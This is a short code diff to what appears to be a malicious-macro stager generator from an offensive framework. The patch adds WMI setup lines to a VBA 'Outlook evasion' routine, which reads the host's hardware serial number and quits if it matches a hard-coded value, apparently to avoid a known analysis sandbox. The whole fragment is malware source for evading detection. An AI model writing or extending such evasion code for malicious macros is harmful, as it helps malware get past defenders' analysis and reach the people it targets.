@@ -177,6 +177,8 @@ class Stager(object):
             macro += "Public Function "+Method+"() As Variant\n"
 
             if OutlookEvasionBool == True:
+                macro += "\tstrComputer = \".\"\n"
+                macro += "\tSet objWMIService = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\cimv2\")\n"
                 macro += "\tSet ID = objWMIService.ExecQuery(\"Select IdentifyingNumber from Win32_ComputerSystemproduct\")\n"
                 macro += "\tFor Each objItem In ID\n"
                 macro += "\t\tIf StrComp(objItem.IdentifyingNumber, \"2UA20511KN\") = 0 Then End\n"
